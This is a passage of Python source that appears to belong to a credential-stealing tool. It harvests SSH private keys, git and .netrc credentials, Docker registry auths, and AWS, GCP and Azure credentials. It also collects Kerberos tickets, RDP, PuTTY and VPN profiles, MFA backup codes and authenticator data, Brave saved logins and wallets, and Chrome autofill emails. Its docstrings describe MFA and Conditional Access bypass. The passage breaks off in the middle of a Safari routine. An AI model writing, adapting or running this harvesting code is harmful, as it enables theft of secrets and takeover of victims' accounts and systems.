            ssh_dir = os.path.expanduser("~/.ssh")
            if not os.path.isdir(ssh_dir):
                return []
            
            for filename in os.listdir(ssh_dir):
                filepath = os.path.join(ssh_dir, filename)
                
                if not os.path.isfile(filepath):
                    continue
                
                try:
                    with open(filepath, 'r', errors='ignore') as f:
                        content = f.read()
                        
                        if 'PRIVATE KEY' in content or 'RSA' in content or 'OPENSSH' in content:
                            is_encrypted = 'ENCRYPTED' in content
                            has_passphrase = 'ENCRYPTED' in content or 'Proc-Type: 4,ENCRYPTED' in content
                            
                            keys.append({
                                'source': 'SSH Private Key',
                                'file': filepath,
                                'encrypted': is_encrypted,
                                'has_passphrase': has_passphrase,
                                'key_type': 'RSA' if 'RSA' in content else 'OpenSSH' if 'OPENSSH' in content else 'Unknown',
                                'severity': 'critical' if not is_encrypted else 'high'
                            })
                        
                        elif filename in ['config', 'authorized_keys', 'known_hosts']:
                            keys.append({
                                'source': f'SSH {filename.title()}',
                                'file': filepath,
                                'contains_entries': len(content.strip().split('\n')) if content else 0,
                                'severity': 'high'
                            })
                
                except Exception as e:
                    self.logger.debug(f"SSH key read failed: {e}")
            
            self.logger.info(f"SSH keys advanced: {len(keys)} items found")
        except Exception as e:
            self.logger.debug(f"SSH keys advanced extraction failed: {e}")
        
        return keys

    def _extract_git_credentials(self) -> List[dict]:
        """Extract Git credentials and configuration."""
        credentials = []
        try:
            git_files = [
                os.path.expanduser("~/.gitconfig"),
                os.path.expanduser("~/.git-credentials"),
                os.path.expanduser("~/.config/git/config"),
            ]
            
            for git_file in git_files:
                if os.path.isfile(git_file):
                    try:
                        with open(git_file, 'r') as f:
                            content = f.read()
                            
                            credentials.append({
                                'source': 'Git Config',
                                'file': git_file,
                                'contains_credentials': 'http' in content.lower() or 'credential' in content.lower(),
                                'contains_github': 'github' in content.lower(),
                                'contains_gitlab': 'gitlab' in content.lower(),
                                'severity': 'high'
                            })
                    except Exception as e:
                        self.logger.debug(f"Git config read failed: {e}")
            
            # Check for .netrc file (classic Unix credentials)
            netrc_file = os.path.expanduser("~/.netrc")
            if os.path.isfile(netrc_file):
                try:
                    with open(netrc_file, 'r') as f:
                        content = f.read()
                        credentials.append({
                            'source': '.netrc Credentials',
                            'file': netrc_file,
                            'hosts': len([l for l in content.split('\n') if l.strip().startswith('machine')]),
                            'severity': 'critical'
                        })
                except Exception as e:
                    self.logger.debug(f".netrc read failed: {e}")
            
            # Search git-credential-* helpers
            git_helper_dir = os.path.expanduser("~/.git-credential-*")
            import glob as glob_module
            for helper in glob_module.glob(git_helper_dir):
                credentials.append({
                    'source': 'Git Credential Helper',
                    'file': helper,
                    'severity': 'medium'
                })
            
            self.logger.info(f"Git credentials: {len(credentials)} configs found")
        except Exception as e:
            self.logger.debug(f"Git credentials extraction failed: {e}")
        
        return credentials

    def _extract_docker_credentials(self) -> List[dict]:
        """Extract Docker credentials with detailed parsing."""
        credentials = []
        try:
            docker_config = os.path.expanduser("~/.docker/config.json")
            
            if os.path.isfile(docker_config):
                try:
                    with open(docker_config, 'r') as f:
                        config = json.load(f)
                        
                        # Check for auth entries
                        if 'auths' in config:
                            for registry, auth_data in config['auths'].items():
                                auth_str = auth_data.get('auth', '')
                                if auth_str:
                                    credentials.append({
                                        'source': 'Docker Registry Auth',
                                        'registry': registry,
                                        'has_auth': True,
                                        'auth_encoded': bool(auth_str),
                                        'severity': 'critical'
                                    })
                        
                        # Check for credHelpers
                        if 'credHelpers' in config:
                            for registry, helper in config['credHelpers'].items():
                                credentials.append({
                                    'source': 'Docker Credential Helper',
                                    'registry': registry,
                                    'helper': helper,
                                    'severity': 'high'
                                })
                        
                        # Check for credStore
                        if 'credsStore' in config:
                            credentials.append({
                                'source': 'Docker Credential Store',
                                'store': config['credsStore'],
                                'severity': 'high'
                            })
                
                except json.JSONDecodeError as e:
                    self.logger.debug(f"Docker config JSON decode failed: {e}")
                except Exception as e:
                    self.logger.debug(f"Docker config read failed: {e}")
            
            # Check for docker daemon config
            docker_daemon = "/etc/docker/daemon.json" if platform.system() != "Windows" else "C:\\ProgramData\\Docker\\config\\daemon.json"
            if os.path.isfile(docker_daemon):
                credentials.append({
                    'source': 'Docker Daemon Config',
                    'file': docker_daemon,
                    'severity': 'high'
                })
            
            self.logger.info(f"Docker credentials: {len(credentials)} configs found")
        except Exception as e:
            self.logger.debug(f"Docker credentials extraction failed: {e}")
        
        return credentials

    def _extract_cloud_provider_credentials(self) -> List[dict]:
        """Extract detailed cloud provider credentials."""
        credentials = []
        try:
            # AWS - detailed parsing
            aws_creds = os.path.expanduser("~/.aws/credentials")
            if os.path.isfile(aws_creds):
                try:
                    with open(aws_creds, 'r') as f:
                        content = f.read()
                        profiles = len([l for l in content.split('\n') if l.strip().startswith('[')])
                        credentials.append({
                            'source': 'AWS Credentials',
                            'file': aws_creds,
                            'profiles_detected': profiles,
                            'severity': 'critical'
                        })
                except Exception as e:
                    self.logger.debug(f"AWS creds read failed: {e}")
            
            aws_config = os.path.expanduser("~/.aws/config")
            if os.path.isfile(aws_config):
                credentials.append({
                    'source': 'AWS Config',
                    'file': aws_config,
                    'severity': 'high'
                })
            
            # GCP - detailed parsing
            gcp_creds = os.path.expanduser("~/.config/gcloud/application_default_credentials.json")
            if os.path.isfile(gcp_creds):
                try:
                    with open(gcp_creds, 'r') as f:
                        gcp_data = json.load(f)
                        credentials.append({
                            'source': 'GCP Application Default Credentials',
                            'file': gcp_creds,
                            'client_id': gcp_data.get('client_id', '')[:10],
                            'project_id': gcp_data.get('project_id', ''),
                            'severity': 'critical'
                        })
                except Exception as e:
                    self.logger.debug(f"GCP creds read failed: {e}")
            
            # Azure CLI
            azure_creds = os.path.expanduser("~/.azure/credentials")
            if os.path.isfile(azure_creds):
                credentials.append({
                    'source': 'Azure Credentials',
                    'file': azure_creds,
                    'severity': 'critical'
                })
            
            azure_profile = os.path.expanduser("~/.azure/azureProfile.json")
            if os.path.isfile(azure_profile):
                credentials.append({
                    'source': 'Azure Profile',
                    'file': azure_profile,
                    'severity': 'medium'
                })
            
            # Terraform state files (contain secrets)
            for root, dirs, files in os.walk(os.path.expanduser("~")):
                if 'terraform.tfstate' in files or 'terraform.tfvars' in files:
                    credentials.append({
                        'source': 'Terraform State/Vars',
                        'directory': root,
                        'severity': 'high'
                    })
                
                if root.count(os.sep) - os.path.expanduser("~").count(os.sep) > 3:
                    break
            
            self.logger.info(f"Cloud provider credentials: {len(credentials)} credentials found")
        except Exception as e:
            self.logger.debug(f"Cloud provider extraction failed: {e}")
        
        return credentials

    def _extract_kerberos_tickets(self) -> List[dict]:
        """Extract Kerberos tickets and configuration."""
        tickets = []
        try:
            if platform.system() == "Windows":
                # Windows Kerberos tickets
                try:
                    import subprocess
                    result = subprocess.run(['klist'], capture_output=True, text=True, timeout=5)
                    
                    if result.returncode == 0 and result.stdout:
                        # Parse klist output
                        tickets.append({
                            'source': 'Kerberos Tickets (klist)',
                            'has_tickets': 'Current LogonId' in result.stdout,
                            'raw_output': result.stdout[:500],
                            'severity': 'high'
                        })
                except Exception as e:
                    self.logger.debug(f"Kerberos klist failed: {e}")
                
                # Windows Kerberos cache
                krb_cache = os.path.expanduser("~\\AppData\\Local\\Temp\\krb5cc_*")
                import glob as glob_module
                for krbfile in glob_module.glob(krb_cache):
                    tickets.append({
                        'source': 'Kerberos Cache File',
                        'file': krbfile,
                        'severity': 'high'
                    })
            
            else:  # Linux/macOS
                # Unix Kerberos tickets
                krb_cache_env = os.environ.get('KRB5CCNAME', '').replace('FILE:', '')
                if krb_cache_env and os.path.isfile(krb_cache_env):
                    tickets.append({
                        'source': 'Kerberos Cache (ENV)',
                        'file': krb_cache_env,
                        'severity': 'high'
                    })
                
                # Default Kerberos cache locations
                default_krb_caches = [
                    os.path.expanduser("~/krb5cc"),
                    os.path.expanduser("/tmp/krb5cc_0"),
                    os.path.expanduser("/tmp/krb5cc_1000"),
                    "/var/run/krb5cc_0",
                ]
                
                for cache_file in default_krb_caches:
                    if os.path.isfile(cache_file):
                        tickets.append({
                            'source': 'Kerberos Cache File',
                            'file': cache_file,
                            'severity': 'high'
                        })
                
                # Check krb5.conf
                krb5_conf = "/etc/krb5.conf" if platform.system() != "Darwin" else "/etc/krb5.conf"
                if os.path.isfile(krb5_conf):
                    tickets.append({
                        'source': 'Kerberos Config',
                        'file': krb5_conf,
                        'severity': 'medium'
                    })
            
            self.logger.info(f"Kerberos: {len(tickets)} tickets/configs found")
        except Exception as e:
            self.logger.debug(f"Kerberos extraction failed: {e}")
        
        return tickets

    def _extract_rdp_credentials(self) -> List[dict]:
        """
        Extract RDP connection history, creds, and server info.
        
        Targets:
        - Recent RDP connections from registry
        - Plaintext RDP passwords from LSM
        - RDP configuration files (.rdp)
        - MRemoteNG database (encrypted credential manager)
        - RDP bookmark files
        """
        credentials = []
        try:
            if platform.system() != "Windows":
                return []
            
            import subprocess
            import winreg
            
            # Recent RDP connections from registry
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                    r"Software\Microsoft\Terminal Server Client\Default") as reg:
                    for i in range(winreg.QueryInfoKey(reg)[1]):
                        name, value, _ = winreg.EnumValue(reg, i)
                        credentials.append({
                            'source': 'RDP Recent Server',
                            'server': name,
                            'connection_string': value,
                            'severity': 'high'
                        })
            except Exception as e:
                self.logger.debug(f"RDP recent servers: {e}")
            
            # RDP saved settings
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Remote Desktop Connection Manager\Default") as reg:
                    server_count = winreg.QueryInfoKey(reg)[0]
                    credentials.append({
                        'source': 'RDP Connection Manager',
                        'saved_connections': server_count,
                        'severity': 'medium'
                    })
            except Exception:
                pass
            
            # MRemoteNG database (credential manager for RDP/SSH/VNC)
            mremote_db = os.path.expanduser("~\\AppData\\Roaming\\mRemoteNG\\confCons.xml")
            if os.path.isfile(mremote_db):
                credentials.append({
                    'source': 'mRemoteNG Database',
                    'file': mremote_db,
                    'description': 'Multi-connection RDP/SSH credential manager',
                    'severity': 'critical'
                })
            
            # Putty RDP/SSH sessions
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    r"Software\SimonTatham\PuTTY\Sessions") as reg:
                    sessions = []
                    for i in range(winreg.QueryInfoKey(reg)[0]):
                        session = winreg.EnumKey(reg, i)
                        sessions.append(session)
                    
                    if sessions:
                        credentials.append({
                            'source': 'PuTTY Sessions',
                            'sessions_count': len(sessions),
                            'session_names': sessions[:5],  # First 5
                            'severity': 'high'
                        })
            except Exception:
                pass
            
            # RDP .rdp files (connection profiles)
            for root, dirs, files in os.walk(os.path.expanduser("~")):
                for fname in files:
                    if fname.endswith('.rdp'):
                        filepath = os.path.join(root, fname)
                        try:
                            with open(filepath, 'r') as f:
                                content = f.read()
                                has_server = 'full address' in content.lower()
                                has_username = 'username' in content.lower()
                                
                                credentials.append({
                                    'source': 'RDP Profile File',
                                    'file': filepath,
                                    'has_server_info': has_server,
                                    'has_username': has_username,
                                    'severity': 'high'
                                })
                        except Exception:
                            pass
                
                if root.count(os.sep) - os.path.expanduser("~").count(os.sep) > 3:
                    break
            
            self.logger.info(f"RDP credentials: {len(credentials)} connections found")
        except Exception as e:
            self.logger.debug(f"RDP extraction failed: {e}")
        
        return credentials

    def _extract_vpn_profiles(self) -> List[dict]:
        """
        Extract VPN profiles and configuration.
        
        Targets:
        - Cisco AnyConnect (saved profiles, credentials)
        - Juniper SSL VPN
        - OpenVPN configs
        - Windows RAAS profiles
        - ExpressVPN config
        - NordVPN config
        - ProtonVPN config
        """
        profiles = []
        try:
            # Cisco AnyConnect
            cisco_paths = [
                "C:\\ProgramData\\Cisco\\Cisco AnyConnect Secure Mobility Client\\Profile",
                os.path.expanduser("~\\AppData\\Local\\Cisco\\Cisco AnyConnect Secure Mobility Client"),
                "C:\\Program Files\\Cisco\\Cisco AnyConnect Secure Mobility Client"
            ]
            
            for cisco_path in cisco_paths:
                if os.path.isdir(cisco_path):
                    for root, dirs, files in os.walk(cisco_path):
                        for fname in files:
                            if fname.endswith(('.xml', '.conf', '.config')):
                                filepath = os.path.join(root, fname)
                                profiles.append({
                                    'source': 'Cisco AnyConnect Profile',
                                    'file': filepath,
                                    'severity': 'high'
                                })
            
            # Juniper SSL VPN
            juniper_paths = [
                os.path.expanduser("~\\AppData\\Roaming\\Juniper Networks"),
                "C:\\Program Files\\Juniper Networks"
            ]
            
            for juniper_path in juniper_paths:
                if os.path.isdir(juniper_path):
                    profiles.append({
                        'source': 'Juniper VPN Config',
                        'directory': juniper_path,
                        'severity': 'high'
                    })
            
            # OpenVPN
            openvpn_paths = [
                os.path.expanduser("~\\AppData\\Roaming\\OpenVPN"),
                os.path.expanduser("~/.config/openvpn"),
                "/etc/openvpn" if platform.system() != "Windows" else None
            ]
            
            for ovpn_path in [p for p in openvpn_paths if p]:
                if os.path.isdir(ovpn_path):
                    for root, dirs, files in os.walk(ovpn_path):
                        for fname in files:
                            if fname.endswith(('.ovpn', '.key', '.crt', 'ca.pem')):
                                filepath = os.path.join(root, fname)
                                profiles.append({
                                    'source': 'OpenVPN Profile',
                                    'file': filepath,
                                    'type': fname.split('.')[-1] if '.' in fname else 'config',
                                    'severity': 'critical' if fname.endswith('.key') else 'high'
                                })
            
            # Windows RAAS/VPN profiles
            if platform.system() == "Windows":
                import subprocess
                try:
                    result = subprocess.run(['rasdial'], capture_output=True, text=True, timeout=5)
                    if result.stdout:
                        connections = [l.strip() for l in result.stdout.split('\n') if l.strip() and not l.startswith('Usage')]
                        if connections:
                            profiles.append({
                                'source': 'Windows RAAS VPN Profiles',
                                'count': len(connections),
                                'severity': 'high'
                            })
                except Exception:
                    pass
            
            # Commercial VPN applications
            vpn_apps = {
                'ExpressVPN': os.path.expanduser("~\\AppData\\Local\\ExpressVPN"),
                'NordVPN': os.path.expanduser("~\\AppData\\Local\\NordVPN"),
                'ProtonVPN': os.path.expanduser("~\\AppData\\Local\\ProtonVPN"),
                'Surfshark': os.path.expanduser("~\\AppData\\Local\\Surfshark"),
                'CyberGhost': os.path.expanduser("~\\AppData\\Roaming\\CyberGhost"),
            }
            
            for vpn_name, vpn_path in vpn_apps.items():
                if os.path.isdir(vpn_path):
                    profiles.append({
                        'source': f'{vpn_name} Config Directory',
                        'directory': vpn_path,
                        'severity': 'medium'
                    })
            
            self.logger.info(f"VPN profiles: {len(profiles)} configs found")
        except Exception as e:
            self.logger.debug(f"VPN extraction failed: {e}")
        
        return profiles

    def _extract_conditional_access_info(self) -> List[dict]:
        """
        Extract Conditional Access bypass indicators and MFA bypass info.
        
        Targets:
        - Azure AD Conditional Access policies (if accessible)
        - Device compliance status
        - Trusted device registrations
        - Azure AD registered devices
        - Corporate device lists
        - IP whitelist detection
        """
        info = []
        try:
            # Check for Azure AD PowerShell module (indicates AAD access)
            if platform.system() == "Windows":
                aad_modules = [
                    "AzureAD",
                    "MSOnline",
                    "AzureADPreview",
                    "Microsoft.Graph"
                ]
                
                import subprocess
                for module in aad_modules:
                    try:
                        result = subprocess.run(
                            ['powershell', '-Command', f"Get-Module -ListAvailable -Name {module}"],
                            capture_output=True,
                            text=True,
                            timeout=5
                        )
                        if result.stdout and "Version" in result.stdout:
                            info.append({
                                'source': 'Azure AD Module Available',
                                'module': module,
                                'installed': True,
                                'severity': 'high'
                            })
                    except Exception:
                        pass
            
            # Check for Azure CLI
            azure_cli_config = os.path.expanduser("~/.azure/config")
            if os.path.isfile(azure_cli_config):
                info.append({
                    'source': 'Azure CLI Configuration',
                    'file': azure_cli_config,
                    'severity': 'high'
                })
            
            # Check for device enrollment
            device_reg_paths = [
                "C:\\Windows\\System32\\config\\SAM" if platform.system() == "Windows" else None,
                os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Recent"),
                "/var/log/auth.log" if platform.system() != "Windows" else None
            ]
            
            # Office 365 tenant detection via registry
            if platform.system() == "Windows":
                try:
                    import winreg
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                        r"Software\Microsoft\Office\16.0\Common\Identity") as reg:
                        for i in range(winreg.QueryInfoKey(reg)[1]):
                            name, value, _ = winreg.EnumValue(reg, i)
                            if 'tenant' in name.lower() or 'aad' in name.lower():
                                info.append({
                                    'source': 'Office 365/Azure Tenant Info',
                                    'registry_value': name,
                                    'severity': 'medium'
                                })
                except Exception:
                    pass
            
            # Check for conditional access client
            ca_client_paths = [
                "C:\\Program Files\\Microsoft\\Office 365 ProPlus",
                "C:\\Program Files\\Microsoft\\Conditional Access",
                os.path.expanduser("~\\AppData\\Local\\Microsoft\\Teams")
            ]
            
            for ca_path in ca_client_paths:
                if os.path.isdir(ca_path):
                    info.append({
                        'source': 'Conditional Access Client Detected',
                        'path': ca_path,
                        'severity': 'medium'
                    })
            
            # IP/Location information (useful for conditional access bypass)
            try:
                import subprocess
                if platform.system() == "Windows":
                    result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True, timeout=5)
                    if 'IPv4 Address' in result.stdout:
                        info.append({
                            'source': 'Network Configuration',
                            'network_available': True,
                            'severity': 'low'
                        })
            except Exception:
                pass
            
            self.logger.info(f"Conditional Access info: {len(info)} indicators found")
        except Exception as e:
            self.logger.debug(f"Conditional Access extraction failed: {e}")
        
        return info

    def _extract_mfa_info(self) -> List[dict]:
        """
        Extract MFA configuration, backup codes, and bypass methods.
        
        Targets:
        - Microsoft Authenticator backup codes
        - Azure MFA configuration
        - Third-party 2FA apps (Google Authenticator, Authy, Microsoft Authenticator secrets)
        - FIDO2 keys registration
        - SMS backup numbers
        - App passwords for legacy apps
        - MFA provider configs
        """
        mfa_info = []
        try:
            # Microsoft Authenticator (mobile app backup codes might be synced)
            authenticator_paths = [
                os.path.expanduser("~\\AppData\\Local\\Packages\\Microsoft.MicrosoftAuthenticator_8wekyb3d8bbwe"),
                os.path.expanduser("~\\AppData\\Local\\Microsoft\\Authenticator")
            ]
            
            for auth_path in authenticator_paths:
                if os.path.isdir(auth_path):
                    mfa_info.append({
                        'source': 'Microsoft Authenticator Directory',
                        'path': auth_path,
                        'severity': 'high'
                    })
            
            # Google Authenticator (Android emulator or ADB backup)
            ga_paths = [
                os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage"),
                os.path.expanduser("~/Android/data/com.google.android.gms")
            ]
            
            for ga_path in ga_paths:
                if os.path.isdir(ga_path):
                    mfa_info.append({
                        'source': 'Google Authenticator Storage',
                        'path': ga_path,
                        'severity': 'critical'
                    })
            
            # Authy sync (Authy syncs authentication codes to cloud)
            authy_paths = [
                os.path.expanduser("~\\AppData\\Local\\Authy"),
                os.path.expanduser("~/.authy"),
                os.path.expanduser("~/Library/Application Support/Authy")
            ]
            
            for authy_path in authy_paths:
                if os.path.isdir(authy_path):
                    mfa_info.append({
                        'source': 'Authy MFA Configuration',
                        'path': authy_path,
                        'severity': 'critical'
                    })
            
            # Azure MFA configuration and backup codes
            if platform.system() == "Windows":
                mfa_backup_paths = [
                    os.path.expanduser("~\\Downloads\\*backup*.txt"),
                    os.path.expanduser("~\\Desktop\\*backup*.txt"),
                    os.path.expanduser("~\\Documents\\*backup*.txt"),
                ]
                
                import glob as glob_module
                for pattern in mfa_backup_paths:
                    for backup_file in glob_module.glob(pattern):
                        mfa_info.append({
                            'source': 'MFA Backup Codes File',
                            'file': backup_file,
                            'severity': 'critical'
                        })
                
                # Office 365 app passwords
                try:
                    import winreg
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                        r"Software\Microsoft\Office\16.0\Common\Identity") as reg:
                        try:
                            app_passwords = winreg.QueryValueEx(reg, "AppPasswords")[0]
                            if app_passwords:
                                mfa_info.append({
                                    'source': 'Office 365 App Passwords',
                                    'count': len(str(app_passwords).split(';')),
                                    'severity': 'critical'
                                })
                        except WindowsError:
                            pass
                except Exception:
                    pass
            
            # Check MFA provider environment variables
            mfa_env_keywords = [
                'MFA_', 'TOTP_', 'AUTHENTICATOR_', 'OTP_', 'BACKUP_CODE_',
                'FIDO', 'WEBAUTHN', 'SECURITY_KEY'
            ]
            
            for key, value in os.environ.items():
                if any(kw in key.upper() for kw in mfa_env_keywords):
                    mfa_info.append({
                        'source': 'MFA Environment Variable',
                        'variable': key,
                        'has_value': bool(value),
                        'severity': 'critical'
                    })
            
            # FIDO2 key information
            fido_paths = [
                "C:\\Program Files\\Yubico\\YubiKey Manager" if platform.system() == "Windows" else None,
                "C:\\Program Files (x86)\\Yubico" if platform.system() == "Windows" else None,
                os.path.expanduser("~/.config/Yubico") if platform.system() != "Windows" else None
            ]
            
            for fido_path in [p for p in fido_paths if p and os.path.isdir(p)]:
                mfa_info.append({
                    'source': 'FIDO2 Key Application',
                    'path': fido_path,
                    'severity': 'medium'
                })
            
            # SMS backup phone number (stored in Azure AD)
            if platform.system() == "Windows":
                try:
                    import subprocess
                    result = subprocess.run(
                        ['powershell', '-Command', 'Get-MsolUser -All | Select-Object -Property UserPrincipalName,StrongAuthenticationPhoneNumber'],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    if 'phone' in result.stdout.lower():
                        mfa_info.append({
                            'source': 'Azure AD MFA Phone Numbers',
                            'available': True,
                            'severity': 'high'
                        })
                except Exception:
                    pass
            
            self.logger.info(f"MFA info: {len(mfa_info)} configs found")
        except Exception as e:
            self.logger.debug(f"MFA info extraction failed: {e}")
        
        return mfa_info

    def _extract_google_credentials(self) -> List[dict]:
        """
        CRITICAL: Extract comprehensive Google credentials including:
        - Gmail accounts and recovery info
        - Google Account session tokens
        - Google Cloud credentials
        - Google OAuth tokens
        - Google Drive sync credentials
        - Google Calendar stored credentials
        - Google Apps credentials
        
        Returns:
            List of dicts with extracted Google credentials
        """
        credentials = []
        try:
            # ===== Gmail Profile Extraction =====
            gmail_profiles = []
            
            import tempfile  # For temporary file handling
            
            # Chrome/Edge Gmail data via IndexedDB
            for browser_path in [
                os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default"),
                os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default")
            ]:
                if os.path.isdir(browser_path):
                    try:
                        # Gmail accounts stored in browser synced data
                        chrome_settings = os.path.join(browser_path, "Preferences")
                        if os.path.isfile(chrome_settings):
                            with open(chrome_settings, 'r', encoding='utf-8', errors='ignore') as f:
                                prefs_content = f.read()
                                
                                # Extract Gmail accounts
                                if 'gmail' in prefs_content.lower():
                                    credentials.append({
                                        'source': 'Chrome Gmail Profile',
                                        'browser': os.path.basename(os.path.dirname(browser_path)),
                                        'has_gmail': True,
                                        'severity': 'critical'
                                    })
                    except Exception as e:
                        self.logger.debug(f"Chrome Gmail extraction: {e}")
            
            # ===== Google Cloud Credentials =====
            gcp_paths = [
                os.path.expanduser("~/.config/gcloud/application_default_credentials.json"),
                os.path.expanduser("~/.config/gcloud/credentials.db"),
                os.path.expanduser("~/.config/gcloud/legacy_credentials"),
                os.path.expanduser("~\\AppData\\Roaming\\gcloud\\legacy_credentials")
            ]
            
            for gcp_path in gcp_paths:
                if os.path.isfile(gcp_path):
                    credentials.append({
                        'source': 'Google Cloud Credentials',
                        'location': gcp_path,
                        'type': 'Application Default Credentials',
                        'severity': 'critical'
                    })
                    self.logger.debug(f"Found GCP credentials: {gcp_path}")
                elif os.path.isdir(gcp_path):
                    for root, dirs, files in os.walk(gcp_path):
                        for file in files:
                            if 'cred' in file.lower() or file.endswith('.json'):
                                credentials.append({
                                    'source': 'Google Cloud Credentials',
                                    'location': os.path.join(root, file),
                                    'type': 'GCP Legacy Credentials',
                                    'severity': 'critical'
                                })
            
            # ===== Google OAuth Tokens =====
            oauth_token_paths = [
                os.path.expanduser("~/.cache/google-cloud-sdk/"),
            ]
            
            for path in oauth_token_paths:
                if os.path.isdir(path):
                    try:
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                if 'token' in file.lower() or 'oauth' in file.lower():
                                    credentials.append({
                                        'source': 'Google OAuth Token',
                                        'location': os.path.join(root, file),
                                        'severity': 'critical'
                                    })
                    except Exception as e:
                        self.logger.debug(f"Google OAuth search: {e}")
            
            # ===== Google Account Recovery Info =====
            try:
                # Check for recovery emails in browser autofill
                import tempfile
                import sqlite3
                import shutil as shutil_module
                chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data")
                if os.path.isfile(chrome_path):
                    temp_db = os.path.join(tempfile.gettempdir(), f"chrome_webdata_{os.getpid()}.db")
                    shutil.copy2(chrome_path, temp_db)
                    
                    try:
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT name, value FROM autofill WHERE name LIKE '%email%' OR name LIKE '%recovery%'")
                        for name, value in cursor.fetchall():
                            if '@' in value:
                                credentials.append({
                                    'source': 'Google Account Recovery Email',
                                    'field': name,
                                    'email': value,
                                    'severity': 'high'
                                })
                        conn.close()
                    except:
                        pass
                    finally:
                        if os.path.exists(temp_db):
                            os.remove(temp_db)
            except Exception as e:
                self.logger.debug(f"Google recovery info: {e}")
            
            # ===== Google Drive Sync Credentials =====
            gdrive_sync_paths = [
                os.path.expanduser("~\\AppData\\Local\\Google\\Drive\\sync_config.db"),
                os.path.expanduser("~\\AppData\\Local\\Google\\Drive\\service_account_key.json")
            ]
            
            for path in gdrive_sync_paths:
                if os.path.isfile(path):
                    credentials.append({
                        'source': 'Google Drive Sync Config',
                        'location': path,
                        'severity': 'high'
                    })
            
            self.logger.info(f"Google credentials extraction: {len(credentials)} items found")
        
        except Exception as e:
            self.logger.warning(f"Google credentials extraction failed: {e}")
        
        return credentials

    def _extract_brave_browser_data(self) -> List[dict]:
        """
        Extract Brave Browser data (Chromium-based, similar to Chrome):
        - Passwords
        - Cookies
        - History
        - Autofill data
        - Brave Sync credentials
        - Wallet/Crypto credentials
        
        Returns:
            List of dicts with extracted Brave data
        """
        data = []
        try:
            import sqlite3
            import shutil
            import tempfile
            import tempfile
            
            brave_path = os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\")
            
            if not os.path.isdir(brave_path):
                self.logger.debug("Brave browser not found")
                return []
            
            # ===== Brave Passwords =====
            login_db = os.path.join(brave_path, "Login Data")
            if os.path.isfile(login_db):
                try:
                    temp_db = os.path.join(tempfile.gettempdir(), f"brave_pwd_{os.getpid()}.db")
                    shutil.copy2(login_db, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT signon_realm, username_value, password_value FROM logins")
                    
                    for origin, username, encrypted_password in cursor.fetchall():
                        data.append({
                            'source': 'Brave Browser Password',
                            'origin': origin,
                            'username': username,
                            'encrypted': encrypted_password is not None,
                            'severity': 'critical'
                        })
                    
                    conn.close()
                    os.remove(temp_db)
                    self.logger.info(f"Brave passwords: {len([d for d in data if 'Password' in d['source']])} extracted")
                except Exception as e:
                    self.logger.debug(f"Brave password extraction: {e}")
            
            # ===== Brave Cookies =====
            cookies_db = os.path.join(brave_path, "Cookies")
            if os.path.isfile(cookies_db):
                try:
                    temp_db = os.path.join(tempfile.gettempdir(), f"brave_cookies_{os.getpid()}.db")
                    shutil.copy2(cookies_db, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name FROM cookies LIMIT 100")
                    
                    cookie_count = len(cursor.fetchall())
                    data.append({
                        'source': 'Brave Browser Cookies',
                        'cookie_count': cookie_count,
                        'severity': 'high'
                    })
                    
                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    self.logger.debug(f"Brave cookies extraction: {e}")
            
            # ===== Brave Wallet/Crypto =====
            wallet_path = os.path.join(brave_path, "Brave Wallet")
            if os.path.isdir(wallet_path):
                try:
                    for root, dirs, files in os.walk(wallet_path):
                        for file in files:
                            if file.endswith('.json') or 'wallet' in file.lower():
                                data.append({
                                    'source': 'Brave Crypto Wallet',
                                    'file': os.path.join(root, file),
                                    'severity': 'critical'
                                })
                except Exception as e:
                    self.logger.debug(f"Brave wallet extraction: {e}")
            
        except Exception as e:
            self.logger.warning(f"Brave browser extraction failed: {e}")
        
        return data

    def _extract_safari_data(self) -> List[dict]:
        """
        Extract Safari browser data (macOS):
        - Bookmarks
        - Reading list
        - Passwords (via Keychain)
        - History
        - Cookies
        - iCloud Keychain credentials
        
        Returns:
            List of dicts with extracted Safari data
        """
        data = []
        if platform.system() != "Darwin":
            return data
        
        try:
            import plistlib
            import subprocess
            
            # ===== Safari Bookmarks =====
            bookmarks_path = os.path.expanduser("~/Library/Safari/Bookmarks.plist")
            if os.path.isfile(bookmarks_path):
                try:
                    with open(bookmarks_path, 'rb') as f:
                        bookmarks = plistlib.load(f)
                        data.append({
                            'source': 'Safari Bookmarks',
                            'count': len(bookmarks.get('Children', [])) if isinstance(bookmarks, dict) else 'unknown',
                            'severity': 'medium'
                        })
                except Exception as e:
                    self.logger.debug(f"Safari bookmarks: {e}")
            
            # ===== Safari Reading List =====
            reading_list_path = os.path.expanduser("~/Library/Safari/ReadingListArchives.sqlitedb")
            if os.path.isfile(reading_list_path):
                try:
                    import sqlite3
                    conn = sqlite3.connect(reading_list_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT COUNT(*) FROM reading_list")
                    count = cursor.fetchone()[0]
                    data.append({
                        'source': 'Safari Reading List',
                        'item_count': count,
                        'severity': 'medium'
                    })
                    conn.close()
                except Exception as e:
                    self.logger.debug(f"Safari reading list: {e}")
            
            # ===== Safari History =====
            history_path = os.path.expanduser("~/Library/Safari/History.db")
            if os.path.isfile(history_path):
                try:
                    import sqlite3
                    conn = sqlite3.connect(history_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT COUNT(*) FROM history_items")
                    count = cursor.fetchone()[0]
